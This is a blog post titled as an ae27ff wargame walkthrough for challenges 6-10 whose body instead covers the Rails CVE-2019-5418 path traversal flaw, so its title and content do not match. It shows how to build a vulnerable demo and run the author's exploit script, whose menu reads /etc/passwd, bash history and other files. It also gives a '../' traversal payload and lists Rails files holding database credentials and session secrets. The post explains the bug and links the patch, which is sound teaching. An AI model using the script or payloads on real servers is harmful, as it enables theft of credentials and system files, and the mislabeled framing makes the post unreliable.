---
excerpt: a writeup of how to solve ae27ff wargame challenges 6-10
layout: post
date: 2019-3-26
comments: false
title: ae27ff wargame challenges 6-10 Walkthrough
tags:
  - ae27ff
  - wargame
image: /images/2019-3-15-4-46-23.jpg
category: writeup
---

# ae27ff  wargame challenges 6-10 sloutions

Decided to write the sloutions i used to solve [ae27ff](http://ae27ff.meme.tips/) wargame challenges.

> [ae27ff](http://ae27ff.meme.tips/) is a set of levels that simulate challenges and puzzles that one may encounter during an ARG \(Alternate Reality Game\) including simple ciphers, steganography, different types of encodings, and familiarity with internet resources. Each level consists of some text, images, data, or files that is intended to lead you to the next page with some amount of investigation.

## \#6 Defeated by brutes! \[Crypto\]:

## Intro:

There is a File Content Disclosure vulnerability in Action View affecting Rails versions <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1.
Specially crafted accept headers in combination with calls to '''render file: '''can cause arbitrary files on the target server to be rendered, disclosing the file contents.
The impact is limited to calls to '''render''' which render file contents without a specified accept format. 

## What is Rails?
Ruby on Rails, or Rails, is a server-side web application framework written in Ruby that uses the model–view–controller (MVC) structure pattern, providing default structures for a database, a web service, and web pages. 
<span class="image fit"><img src="{{ "/images/MVC.png" | absolute_url }}" alt="" /></span>

Rails is used to build full web applications like (Basecamp, GitHub, Shopify, Airbnb, Twitch, SoundCloud, Hulu, Zendesk, Square, Cookpad.)


### Path Traversal:

This vulnerability is a path traversal vulnerability (<a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10: A5:2017-Broken Access Control</a>)
A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system).

This attack is also known as “dot-dot-slash,” “directory traversal,” “directory climbing” and “backtracking.” 
source: <a href="https://www.owasp.org/index.php/Path_Traversal">OWASP Path Traversal</a>


### reproducing:
To demonstrate the vulnerability, i bult a Ruby on Rails site: <a href="http://bandit.bad3r.xyz/">bandit.bad3r.xyz</a>
you can clone my site and run it locally by installing Ruby on Rails then cloning my repo <a href="https://github.com/Bad3r/RailroadBandit">Bad3r/RailRoadBandit</a>
Digital Ocean has an excellent guide to get you started make sure to install a vulnerable Rails (e.g 5.2.1): <a href="https://www.digitalocean.com/community/tutorials/how-to-install-ruby-on-rails-with-rbenv-on-ubuntu-18-04">
How To Install Ruby on Rails with rbenv on Ubuntu 18.04</a>
you can also create your demo manually by editing the default application controller in
~~~
<web root folder>/app/controllers/application_controller.rb
~~~
open the file and add a call to "render file:"
~~~ruby
class ApplicationController < ActionController::Base
    def index
        render file:  "#{Rails.root}/public/bandit/bandit.html"
    end
end
~~~
here am just rendering an html file but you can also render any text fle.then edit the route file located in 
~~~
<web root folder>/config/routes.rb
~~~
to add a route for the controller:
~~~ruby
Rails.application.routes.draw do
    get 'application/index' => 'application#index'
	root 'application#index'
end
~~~
thats all you need to follow this demo. you should check if the file is rendered correctly and the route.rb config is correct.


### Exploiting the vulnerability

the script used in the demo is available in my Github repo <a href="https://github.com/Bad3r/RailroadBandit">Bad3r/RailRoadBandit</a>
run the script using the format:
~~~Bash
┌ ~/RailroadBandit
└> % python3 Bandit.py http://bandit.bad3r.xyz/ 
~~~
then you will see a menu of builtin options to view some sensetive data:
~~~Bash

└> % python3 Bandit.py http://bandit.bad3r.xyz/

	----------------------------------------------
	Arbitrary Traversal exploit for Ruby on Rails
	                 CVE-2019-5418
	----------------------------------------------
	

             Enter an option or a file path (enter quit or q to exit)

             enter 1 for /etc/passwd 

             enter 2 for /proc/cpuinfo 

             enter 3 for bash history 

             enter 4 to brute force: 
~~~
you can use one of the builtin options or give the path for the file manually
~~~Bash
../../../../../../../../../etc/passwd
~~~

 here we use ../ for directory traversal, the result is:
<span class="image fit"><img src="{{ "/images/etc_passwd.png" | absolute_url }}" alt="" /></span>
 
am working on adding more features to the script like brute forcing the web root diretory name.


### Ruby on Rails sensitive files

there is some important files in ruby on rails that can also reveal sensitive information like:

| File                                 | Description |
|:-------------------------------------|:---------------------------------------------------:|
| /config/database.yml                 | May contain production credentials                  |
| /config/initializers/secret_token.rb | Contains a secret used to hash session cookie       |
| db/seeds.rb                          | May contain seed data including bootstrap admin user|
| /db/development.sqlite3              |May contain the SQL database                         |
|----

### Patch

https://github.com/rails/rails/commit/f4c70c2222180b8d9d924f00af0c7fd632e26715
<span class="image fit"><img src="{{ "/images/path_bandit.jpg" | absolute_url }}" alt="" /></span>
